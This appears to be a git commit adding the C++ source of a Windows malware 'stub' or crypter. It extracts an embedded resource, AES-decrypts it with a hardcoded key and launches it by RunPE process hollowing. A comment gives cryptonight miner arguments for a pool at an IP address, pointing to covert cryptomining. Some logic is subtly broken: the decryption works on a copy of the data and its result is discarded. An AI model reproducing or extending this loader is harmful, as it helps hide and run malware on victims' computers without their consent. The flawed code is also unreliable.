5a18878a3129d76dfdaf08c69aa7bfd33e3bdb56
dakrspiderbots <lenna15h08elli@gmail.com>
2019-04-16 20:27:53 +0200

    Added Stub Code

---
+++ Stub/main.cpp
@@ -0,0 +1,102 @@
+﻿#include <iostream>
+#include <Windows.h>
+#include <fstream>
+#include "Runpe.h"
+#include <vector>
+#include <string>
+#include "Header.h"
+using namespace std;
+
+
+int Rsize;
+
+
+std::vector<char> RData;
+
+void Resource(int id)
+{
+	size_t Rsize;
+	HRSRC hResource = FindResource(NULL, MAKEINTRESOURCE(id), RT_RCDATA);
+	HGLOBAL temp = LoadResource(NULL, hResource);
+	Rsize = SizeofResource(NULL, hResource);
+	RData.resize(Rsize);
+	memcpy((void*)RData.data(), temp, Rsize);  // replace &RData[0] with RData.data() if C++11
+}
+
+
+void AESDecrypt(std::vector<char> toDecrypt, int size)
+{
+	//Explanation exist in Builder
+	unsigned char key[KEY_256] = "S#q-}=6{)BuEV[GDeZy>~M5D/P&Q}6>";
+
+	unsigned char ciphertext[BLOCK_SIZE];
+	unsigned char decrypted[BLOCK_SIZE];
+
+	aes_ctx_t* ctx;
+	virtualAES::initialize();
+	ctx = virtualAES::allocatectx(key, sizeof(key));
+
+	int count = 0;
+	int index = size / 16;
+	int innerCount = 0;
+	int innerIndex = 16;
+	int dataCount = 0;
+	int copyCount = 0;
+	for (count; count < index; count++)
+	{
+		for (innerCount = 0; innerCount < innerIndex; innerCount++)
+		{
+			ciphertext[innerCount] = toDecrypt[dataCount];
+			dataCount++;
+		}
+
+		virtualAES::decrypt(ctx, ciphertext, decrypted);
+
+		for (innerCount = 0; innerCount < innerIndex; innerCount++)
+		{
+			toDecrypt[copyCount] = decrypted[innerCount];
+			copyCount++;
+		}
+	}
+
+	delete ctx;
+}
+
+void enc()
+{
+	switch (RData.back())
+	{
+	case '1':
+		{
+			std::ofstream out("1.txt");
+		}
+		break;
+	case '2':
+		{
+			AESDecrypt(RData, RData.size());
+		}
+		break;
+	}
+	return;
+}
+
+
+
+int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
+{
+	Resource(10);
+	enc();
+
+	LPVOID pFile;
+	TCHAR szFilePath[1024];
+
+	pFile = RData.data();
+	if (pFile)
+	{
+		GetModuleFileNameA(0, LPSTR(szFilePath), 1024);
+		//replace process.exe with "szFilePath" if you want to inject it in the SAME file.
+		//or you may write the file path you want to inject in.
+		ExecFile(LPSTR(szFilePath), pFile, ""); // "  --donate-level=1 -a cryptonight --url=35.204.135.202:3333 --threads 1 --user=x"
+	}
+
+};
